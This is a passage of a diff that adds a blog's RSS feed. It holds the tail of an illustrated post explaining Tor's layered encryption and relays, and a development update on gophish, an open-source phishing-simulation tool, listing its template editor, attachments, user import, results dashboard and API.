+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 470.8,37.9 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-8-8&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 451.6,39.1 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-8-9&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 433.6,35.6 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-23&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 414.4,36.7 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-62&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 396.1,36.7 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-57&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 380.0,36.8 c 0,0 41.8,75.0 0,153.5&#34;
+      id=&#34;path6775-8-827&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 360.4,170.4 c 0,0 18.9,-42.4 0,-114.0&#34;
+      id=&#34;path6924&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 353.0,170.9 c 0,0 18.9,-42.4 0,-114.0&#34;
+      id=&#34;path6924-0&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 344.8,171.8 c 0,0 18.9,-42.4 0,-114.0&#34;
+      id=&#34;path6924-5&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 336.7,170.7 c 0,0 18.9,-42.4 0,-114.0&#34;
+      id=&#34;path6924-5-5&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 328.7,170.7 c 0,0 18.9,-42.4 0,-114.0&#34;
+      id=&#34;path6924-5-2&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 320.1,169.6 c 0,0 18.9,-42.4 0,-114.0&#34;
+      id=&#34;path6924-5-7&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 311.5,169.6 c 0,0 18.9,-42.4 0,-114.0&#34;
+      id=&#34;path6924-5-6&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 303.5,171.3 c 0,0 18.9,-42.4 0,-114.0&#34;
+      id=&#34;path6924-5-78&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 293.1,149.8 c 0,0 7.4,-30.9 0,-65.8&#34;
+      id=&#34;path7008&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 288.8,148.9 c 0,0 7.4,-30.9 0,-65.8&#34;
+      id=&#34;path7008-7&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 283.7,148.9 c 0,0 7.4,-30.9 0,-65.8&#34;
+      id=&#34;path7008-8&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 278.5,149.5 c 0,0 7.4,-30.9 0,-65.8&#34;
+      id=&#34;path7008-1&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 273.9,149.8 c 0,0 7.4,-30.9 0,-65.8&#34;
+      id=&#34;path7008-6&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 268.8,148.6 c 0,0 7.4,-30.9 0,-65.8&#34;
+      id=&#34;path7008-0&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1&#34;
+      d=&#34;m 263.3,148.9 c 0,0 7.4,-30.9 0,-65.8&#34;
+      id=&#34;path7008-9&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 254.8,97.7 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 252.7,97.9 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-8&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 250.6,97.4 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-9&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 248.6,96.8 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-0&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 246.1,97.2 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-00&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 243.6,98.2 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-7&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 241.1,98.1 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-2&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 238.7,97.9 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-5&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 236.3,97.2 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-52&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 233.8,98.2 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-1&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 231.5,98.2 c 0,0 8.0,17.9 0,41.2&#34;
+      id=&#34;path7074-4&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1;stroke-miterlimit:4;stroke-dasharray:none&#34;
+      d=&#34;m 345.5,37.5 -153.5,0 -51.4,-29.7&#34;
+      id=&#34;path7159&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1;stroke-miterlimit:4;stroke-dasharray:none&#34;
+      d=&#34;m 287.0,56.4 -98.3,0 -49.3,-28.2&#34;
+      id=&#34;path7161&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+      d=&#34;m 248.7,82.2 -57.3,0 -53.0,-28.3&#34;
+      id=&#34;path7163&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;path
+      style=&#34;fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1;stroke-miterlimit:4;stroke-dasharray:none&#34;
+      d=&#34;m 221.7,117.7 -33.2,0 -55.3,-31.9&#34;
+      id=&#34;path7165&#34;
+      inkscape:connector-curvature=&#34;0&#34; /&gt;
+   &lt;text
+      xml:space=&#34;preserve&#34;
+      x=&#34;-5.1&#34;
+      y=&#34;80.6&#34;
+      id=&#34;text3992-8&#34;
+      style=&#34;font-size:14.0px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;fill:#ffffff;font-family:Segoe UI;-inkscape-font-specification:Segoe UI&#34;&gt;&lt;tspan
+        sodipodi:role=&#34;line&#34;
+        x=&#34;-5.1&#34;
+        y=&#34;80.6&#34;
+        id=&#34;tspan3994-6&#34;
+        style=&#34;font-size:12px;fill:#ffffff&#34;&gt;Original Data&lt;/tspan&gt;&lt;/text&gt;
+ &lt;/svg&gt;
+       &lt;/div&gt;
+&lt;br/&gt;
+&lt;/p&gt;
+
+&lt;p&gt;This means that we have wrapped our original data in layers of encryption, much like an onion is wrapped in layers of&amp;hellip;well, more onion, I guess.&lt;/p&gt;
+
+&lt;p&gt;By doing this, each relay only has the information it needs to know - where it got the encrypted data from, and where to send it to next. Encrypting data this way is beneficial to both parties: client traffic isn&amp;rsquo;t compromised and relays can&amp;rsquo;t be held liable for data they can&amp;rsquo;t see.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Note: It&amp;rsquo;s important to remember that exit relays &lt;strong&gt;can see the original data sent by the client&lt;/strong&gt;, since they have to pass that data to the destination. This means that, if credentials are passed over HTTP, FTP, or other cleartext protocols, the exit relays can sniff the traffic!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;next-steps:b6a2f7f7305d0d4a88042f3de1458bb0&#34;&gt;Next Steps&lt;/h3&gt;
+
+&lt;p&gt;Our journey into the operation of Tor is just beginning. In future posts, we&amp;rsquo;ll take a look at how the Tor network is organized, discuss the differences between relays and bridges, take a deep-dive into how exactly the encryption works, take a step-by-step view of what happens behind the scenes when you start up your Tor client for the first time, and more.&lt;/p&gt;
+
+&lt;p&gt;We have a lot to cover! Until then, feel free to read up on the official &lt;a href=&#34;https://gitweb.torproject.org/torspec.git/tree/&#34;&gt;Tor specifications&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;As always, please let me know if you have any questions or comments below!&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Update: &lt;a href=&#34;http://jordan-wright.com/blog/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/&#34;&gt;Part two - &amp;ldquo;Relays vs. Bridges&amp;rdquo;&lt;/a&gt; has been published!&lt;/em&gt;&lt;/p&gt;
+
+&lt;div&gt;
+&lt;script&gt;
+d= new Vivus(&#39;earth&#39;, {type: &#39;oneByOne&#39;, duration: 30, start: &#39;inViewport&#39;, forceRender: false, dashGap: 20});
+s= new Vivus(&#39;encryption&#39;, {type: &#39;async&#39;, duration: 30, start: &#39;inViewport&#39;, forceRender: false, dashGap: 20});
+e= new Vivus(&#39;network&#39;, {type: &#39;oneByOne&#39;, duration: 30, start: &#39;inViewport&#39;, forceRender: false, dashGap: 20});
+&lt;/script&gt;
+&lt;/div&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Gophish Update: Getting Closer to Alpha!</title>
+      <link>http://jordan-wright.com/blog/2015/02/26/gophish-update-getting-closer-to-alpha/</link>
+      <pubDate>Thu, 26 Feb 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/02/26/gophish-update-getting-closer-to-alpha/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/gophish_purple.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:04122820eae1345d676d25dffa9afb36&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;It&amp;rsquo;s been a busy couple of months!&lt;/p&gt;
+
+&lt;p&gt;I thought it would be worth providing a long-overdue update into the development status of &lt;a href=&#34;http://github.com/jordan-wright/gophish&#34;&gt;gophish&lt;/a&gt;. Overall, the project is getting closer to beta status every day, and I&amp;rsquo;m hoping to see a &lt;a href=&#34;https://github.com/jordan-wright/gophish/milestones&#34;&gt;0.1 release&lt;/a&gt; at the end of March.&lt;/p&gt;
+
+&lt;p&gt;Without further ado, let&amp;rsquo;s dive in and see where we&amp;rsquo;re at.&lt;/p&gt;
+
+&lt;h3 id=&#34;design:04122820eae1345d676d25dffa9afb36&#34;&gt;Design&lt;/h3&gt;
+
+&lt;p&gt;I moved away from the previous black and white look to a friendlier color scheme using the fantastic &lt;a href=&#34;http://designmodo.github.io/Flat-UI/&#34;&gt;Flat-UI&lt;/a&gt; package from DesignModo.&lt;/p&gt;
+
+&lt;h3 id=&#34;features:04122820eae1345d676d25dffa9afb36&#34;&gt;Features&lt;/h3&gt;
+
+&lt;p&gt;My goal is to make using gophish both easy-to-use and powerful. With this in mind, I&amp;rsquo;ve implemented some neat features to make setting up awesome campaigns as simple as possible.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s take a look at a few:&lt;/p&gt;
+
+&lt;h4 id=&#34;wysiwyg-editing-of-html-templates:04122820eae1345d676d25dffa9afb36&#34;&gt;WYSIWYG Editing of HTML Templates&lt;/h4&gt;
+
+&lt;p&gt;You can make pixel perfect email and landing page templates and customize the content seamlessly. While I started with some &lt;code&gt;contenteditable&lt;/code&gt; hacks, I couldn&amp;rsquo;t find a reliable way to allow full page rendering (without opening up security issues or design incompatibility problems). So, I looked around and found that &lt;a href=&#34;http://ckeditor.com&#34;&gt;CKEditor&lt;/a&gt; which takes care of this and more!&lt;/p&gt;
+
+&lt;p&gt;Now we can switch between a raw HTML source view and a fully rendered view in just one-click. Want to see what a template would look like full-screen? Also no problem!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/gophish_screenshots/gophish_template.gif&#34;/&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;email-attachments:04122820eae1345d676d25dffa9afb36&#34;&gt;Email Attachments&lt;/h4&gt;
+
+&lt;p&gt;Sending emails with links in them is great, but if we can&amp;rsquo;t add &amp;ldquo;malicious&amp;rdquo; attachments to emails we send, then we miss a &lt;em&gt;huge&lt;/em&gt; attack tactic deployed against our users. I&amp;rsquo;m excited to report that attaching files to email templates is just a matter of selecting the &amp;ldquo;Add Files&amp;rdquo; button on the email template modal and choosing the file you want to attach. Easy as that!&lt;/p&gt;
+
+&lt;h4 id=&#34;bulk-importing-of-users:04122820eae1345d676d25dffa9afb36&#34;&gt;Bulk Importing of Users&lt;/h4&gt;
+
+&lt;p&gt;Adding users to a group manually is a &lt;em&gt;pain&lt;/em&gt;. So, I&amp;rsquo;ve implemented bulk inserting that accepts a CSV file, and adds the users automatically. Right now, it allows for the following fields:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;First Name&lt;/li&gt;
+&lt;li&gt;Last Name&lt;/li&gt;
+&lt;li&gt;Email&lt;/li&gt;
+&lt;li&gt;Position&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/gophish_screenshots/gophish_group.gif&#34;/&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;campaign-results-dashboard:04122820eae1345d676d25dffa9afb36&#34;&gt;Campaign Results Dashboard&lt;/h4&gt;
+
+&lt;p&gt;Executing campaigns isn&amp;rsquo;t helpful if you don&amp;rsquo;t have a way to see the results. This is why I&amp;rsquo;ve been working on a campaign results dashboard that will serve as a one-stop-shop for viewing campaign results. The plan is to start by having information about the campaign itself, such as clicks over time and overall success rate. However, I want to expand this to also include information about the user, such as browser plugin information, demographics and location, etc.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/gophish_screenshots/gophish_campaign_results.gif&#34;/&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;full-api-support:04122820eae1345d676d25dffa9afb36&#34;&gt;Full API Support&lt;/h4&gt;
+
+&lt;p&gt;From the get-go, gophish was &lt;strong&gt;designed for automation&lt;/strong&gt;. Setting up campaigns, importing users, getting results can all be done manually through the Web UI. However, all the UI does is call out to the API. For darn-near &lt;em&gt;everything&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;To take a look at the API documentation, just load up gophish and head over to &lt;code&gt;/api&lt;/code&gt;!&lt;/p&gt;
+
+&lt;h4 id=&#34;coming-soon:04122820eae1345d676d25dffa9afb36&#34;&gt;Coming Soon&lt;/h4&gt;
+
+&lt;p&gt;While I&amp;rsquo;m proud of all that&amp;rsquo;s been accomplished with gophish so far, it&amp;rsquo;s not even close to being done.&lt;/p&gt;
+
+&lt;p&gt;Here are just a few of the &lt;em&gt;many&lt;/em&gt; features coming down the pipeline to get excited about:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;A more fleshed out Campaign Results dashboard (&lt;span&gt;&lt;i class=&#34;fa fa-heart-o&#34;&gt;&lt;/i&gt;&lt;/span&gt; metrics)&lt;/li&gt;
+&lt;li&gt;Ability to schedule campaigns in advance&lt;/li&gt;
+&lt;li&gt;Email tracking - know when an email is opened!&lt;/li&gt;
+&lt;li&gt;The ability to clone a landing page template with one click&lt;/li&gt;
+&lt;li&gt;Support for importing emails from the &amp;ldquo;Source&amp;rdquo; of an existing email (or hopefully even an IMAP service directly!)&lt;/li&gt;
+&lt;li&gt;&amp;ldquo;Teams&amp;rdquo; support to share and coordinate phishing campaigns&lt;/li&gt;
+&lt;li&gt;Realtime updates to campaign results dashboard&lt;/li&gt;
+&lt;li&gt;Client API libraries (eg Python)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;conclusion:04122820eae1345d676d25dffa9afb36&#34;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;Gophish development continues to push forward as much as possible. While I&amp;rsquo;m balancing time between a few different projets, I hope to get gophish alpha out the door as soon as possible. As always, please don&amp;rsquo;t hesitate to let me know if you have any questions or comments! Also, if you use gophish and have any ideas/issues, let me know on &lt;a href=&#34;http://github.com/jordan-wright/gophish/issues&#34;&gt;Github&lt;/a&gt;!&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
